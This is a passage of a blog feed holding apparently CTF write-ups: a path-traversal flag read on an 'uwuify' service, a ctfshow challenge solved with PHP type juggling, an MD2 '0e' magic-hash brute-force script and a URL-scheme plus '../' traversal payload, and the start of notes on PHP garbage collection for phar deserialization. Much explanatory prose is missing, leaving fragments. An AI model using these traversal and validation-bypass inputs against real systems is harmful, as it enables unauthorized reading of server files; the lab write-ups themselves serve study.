operator">=</span> <span class="token string">"texts avali to uwuify: "</span><span class="token punctuation">;</span>    <span class="token keyword">let</span> files <span class="token operator">=</span> <span class="token keyword">await</span> fs<span class="token punctuation">.</span>promises<span class="token punctuation">.</span><span class="token function">readdir</span><span class="token punctuation">(</span>textsDir<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">let</span> file <span class="token keyword">of</span> files<span class="token punctuation">)</span><span class="token punctuation">&#123;</span>        output <span class="token operator">+=</span> <span class="token string">"\r\n"</span> <span class="token operator">+</span> file<span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span>    output <span class="token operator">+=</span> <span class="token string">"\r\n\r\nUse /uwuify?src=&lt;text file name> to uwuify a text file!"</span><span class="token punctuation">;</span>    res<span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span>output<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>app<span class="token punctuation">.</span><span class="token function">listen</span><span class="token punctuation">(</span>process<span class="token punctuation">.</span>env<span class="token punctuation">.</span><span class="token constant">PORT</span> <span class="token operator">||</span> <span class="token number">3000</span><span class="token punctuation">,</span> <span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token operator">=></span> <span class="token punctuation">&#123;</span>  console<span class="token punctuation">.</span><span class="token function">log</span><span class="token punctuation">(</span><span class="token string">"Server Up!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>dockerfile</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">FROM node:16COPY ./* /home/node/app/COPY ./public/* /home/node/app/public/COPY ./public/texts/* /home/node/app/public/texts/WORKDIR /home/node/appRUN <span class="token function">npm</span> <span class="token function">install</span>ENV <span class="token assign-left variable">PORT</span><span class="token operator">=</span><span class="token number">8082</span>RUN <span class="token function">chown</span> <span class="token parameter variable">-R</span> node:node /home/node/app<span class="token environment constant">USER</span> <span class="token function">node</span>CMD <span class="token punctuation">[</span><span class="token string">"bash"</span>, <span class="token string">"launch.sh"</span><span class="token punctuation">]</span>EXPOSE <span class="token number">8082</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>flag.txt&#x2F;home&#x2F;node&#x2F;app&#x2F;flag.txt<br><code>~</code><code>https://uwuasaservice.amt.rs/uwuify?src=~</code><code>cat ~</code></p><blockquote><p>cat: &#x2F;home&#x2F;node: Is a directory</p></blockquote><p>flag<br><a href="https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt">https://uwuasaservice.amt.rs/uwuify?src=~/app/flag.txt</a></p><blockquote><p>amateuwsctf{so_wmao_this_fwag_is_gonna_be_a_wot_wongew_than_most_fwag_othew_fwags_good_wuck_have_fun_decoding_it_end_of_fwag}</p></blockquote>]]></content>
      
      
      <categories>
          
          <category> WP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>SSRFtricks</title>
      <link href="/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/"/>
      <url>/2023/07/20/%E6%B6%89%E5%8F%8ASSRF%E7%9A%84%E4%B8%80%E4%BA%9Btricks/</url>
      
        <content type="html"><![CDATA[<h2 id="trick1"><a href="#trick1" class="headerlink" title="trick1"></a>trick1</h2><blockquote><p>php</p></blockquote><p><a href="https://ctf.show/challenges#web2_%E6%95%85%E4%BA%BA%E5%BF%83-482">ctfshow</a></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span> <span class="token keyword">and</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$a</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token number">7</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">!=</span><span class="token number">0</span> <span class="token keyword">and</span> <span class="token variable">$a</span><span class="token operator">**</span><span class="token number">2</span><span class="token operator">==</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>    <span class="token variable">$d</span> <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token variable">$b</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token punctuation">(</span><span class="token variable">$c</span><span class="token operator">==</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token variable">$c</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span>         <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>        <span class="token keyword">echo</span> <span class="token string single-quoted-string">'md5?!'</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>    <span class="token keyword">echo</span> <span class="token string single-quoted-string">'flag?!'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p><code>if(is_numeric($a) and strlen($a)&lt;7 and $a!=0 and $a**2==0)&#123;</code><br>aa7a0a0</p></blockquote><p><strong>1e-234</strong></p><blockquote><p><code>$d = ($b==hash(&quot;md2&quot;, $b)) &amp;&amp; ($c==hash(&quot;md2&quot;,hash(&quot;md2&quot;, $c)));</code><br>robots.txt</p><p><img src="https://img-blog.csdnimg.cn/e78bc410ddb4452f9a789038554b8fc3.png" alt="1"><br>0emd20e</p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token variable">$i</span><span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token number">999999</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'024452'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$b</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$b = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$b</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span><span class="token function">hash</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"md2"</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'0e'</span><span class="token operator">.</span><span class="token variable">$i</span><span class="token operator">.</span><span class="token string single-quoted-string">'48399'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">is_numeric</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">)</span> <span class="token operator">&amp;&amp;</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$c</span><span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">2</span><span class="token punctuation">)</span><span class="token operator">===</span><span class="token string single-quoted-string">'0e'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$i = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$i</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string single-quoted-string">'$c = '</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token variable">$c</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><br><img src="https://img-blog.csdnimg.cn/24773c08bf7943759760909a91edf091.png" alt="2">b&#x3D;0e652024452&amp;c&#x3D;0e603448399</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$d</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>             <span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hint.php'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>             <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">,</span><span class="token constant">FILTER_VALIDATE_URL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                <span class="token variable">$host</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token variable">$host</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                 <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/ctfshow\.com$/'</span><span class="token punctuation">,</span><span class="token variable">$host</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>                    <span class="token function">print_r</span><span class="token punctuation">(</span><span class="token function">file_get_contents</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                    <span class="token keyword">echo</span> <span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>                <span class="token punctuation">&#125;</span>            <span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span>                <span class="token keyword">echo</span> <span class="token string single-quoted-string">'please give me url!!!'</span><span class="token punctuation">;</span>            <span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>filter_var</p><blockquote><p>filter_var() </p></blockquote><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">filter_var</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"someone@example....com"</span><span class="token punctuation">,</span> <span class="token constant">FILTER_VALIDATE_EMAIL</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is not valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">else</span><span class="token punctuation">&#123;</span><span class="token keyword">echo</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"E-mail is valid"</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p></p><blockquote><p>E-mail is not valid </p></blockquote><p><img src="https://img-blog.csdnimg.cn/c283211f432e4879a0d9d4b1c9c5f153.png" alt="1"><a href="https://www.runoob.com/php/php-ref-filter.html"></a></p><p>php</p><blockquote><p>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;<br>Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F; )<br>url&#x3D;hhh:&#x2F;&#x2F;ctfshow.com&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt<br>Array ( [scheme] &#x3D;&gt; hhh [host] &#x3D;&gt; ctfshow.com [path] &#x3D;&gt; &#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;..&#x2F;fl0g.txt ) ctfshow{91873400-0885-4a10-a7d9-75c9568f5e86} </p></blockquote>]]></content>
      
      
      <categories>
          
          <category>  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>php(GC)phar</title>
      <link href="/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/"/>
      <url>/2023/07/17/php%E7%9A%84%E5%9E%83%E5%9C%BE%E5%9B%9E%E6%94%B6-GC-%E6%9C%BA%E5%88%B6%E4%BB%8B%E7%BB%8D%E4%BB%A5%E5%8F%8A%E5%9C%A8phar%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%AD%E7%9A%84%E4%B8%80%E4%BA%9B%E5%88%A9%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<meta name="referrer" content="no-referrer"/><h2 id="php-GC-phar"><a href="#php-GC-phar" class="headerlink" title="php(GC)phar"></a>php(GC)phar</h2><h2 id="-destruct"><a href="#-destruct" class="headerlink" title="__destruct()"></a>__destruct()</h2><p>php<code>__destruct()</code><code>__destruct()</code><code>__destruct()</code><code>null</code>,phpunset()<code>__destruct()</code>GC</p><h2 id="GC"><a href="#GC" class="headerlink" title="GC"></a>GC<a href="https://www.php.net/manual/zh/features.gc.php"></a></h2><p>phppythonjavac# </p><p>GCPHP<strong></strong><strong></strong>NULLGC<code>__destruct()</code></p><h3 id=""><a href="#" class="headerlink" title=""></a></h3><p>phpzvalzval<code>is_ref</code><code>refcount</code></p><p><code>is_ref</code>boolphpphp<code>&amp;</code>zval</p><p><code>refcount</code>zvalzval</p><p>xdebug<br> <img src="https://img-blog.csdnimg.cn/32b4413f344d4a71bbdaed0f95532c0b.png" alt="1"></p><p></p><p>php5.6.9</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">,</span> <span class="token variable">$c</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//$b,$c</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php5.6.9</p><blockquote><p>a: (refcount&#x3D;3, is_ref&#x3D;0)&#x3D;new string<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;new string&#x2F;&#x2F;b,b,cazvala:(refcount&#x3D;2,isref&#x3D;1)&#x3D;newstring&#x2F;&#x2F;azvala:(refcount&#x3D;2,isref&#x3D;1)&#x3D;newstring&#x2F;&#x2F;baab</p></blockquote><p>php7.3.4</p><blockquote><p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;new string<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;new string<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;new string&#x2F;&#x2F;bba$b</p></blockquote><p></p><p>php7$c &#x3D; $b &#x3D; $aa1</p><p>PHP 7zvalzval</p><p>nullboolintdoublerefcount</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token constant">null</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token constant boolean">true</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'b'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token operator">=</span><span class="token number">1</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token number">1.1</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'d'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4</p><blockquote><p>a: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;0, is_ref&#x3D;0)&#x3D;1.1</p><p>refcount0</p></blockquote><p>php5.6.9</p><blockquote><p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;NULL<br> b: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;TRUE<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1<br> d: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1.1</p><p>refcount1</p></blockquote><p>refcountphp5<strong></strong></p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name-definition class-name">sd</span><span class="token punctuation">&#123;</span>    <span class="token keyword">public</span> <span class="token variable">$s</span><span class="token operator">=</span><span class="token string single-quoted-string">'1'</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token variable">$a</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">sd</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span><span class="token operator">=</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4</p><blockquote><p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;1 }</p></blockquote><p>php5.6.9</p><blockquote><p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;class sd { public $s &#x3D; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;1 }</p><p>refcount</p></blockquote><p>;</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$a</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"new string"</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">unset</span><span class="token punctuation">(</span> <span class="token variable">$b</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$b</span> <span class="token operator">=</span> <span class="token operator">&amp;</span><span class="token variable">$a</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'a'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4</p><blockquote><p>a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;new string<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;new string<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;new string</p></blockquote><p>php5.6.9</p><blockquote><p>a: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;new string<br> a: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;new string<br> a: (refcount&#x3D;2, is_ref&#x3D;1)&#x3D;new string</p></blockquote><p>php5</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token variable">$c</span> <span class="token operator">=</span> <span class="token keyword">array</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'a'</span><span class="token punctuation">,</span><span class="token string single-quoted-string">'b'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$d</span><span class="token operator">=</span><span class="token variable">$c</span><span class="token punctuation">;</span><span class="token variable">$c</span><span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token string single-quoted-string">'c'</span><span class="token punctuation">;</span><span class="token comment">//</span><span class="token function">xdebug_debug_zval</span><span class="token punctuation">(</span> <span class="token string single-quoted-string">'c'</span> <span class="token punctuation">)</span><span class="token punctuation">;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>php7.3.4</p><blockquote><p>c: (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;a, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;b)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;a, 1  &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;b, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;c)</p></blockquote><p>php5.6.9</p><blockquote><p>c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;a, 1 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;b)<br> c: (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;array (0 &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;a, 1  &#x3D;&gt; (refcount&#x3D;2, is_ref&#x3D;0)&#x3D;b, 2 &#x3D;&gt; (refcount&#x3D;1, is_ref&#x3D;0)&#x3D;c)</p></blockquote><p><img 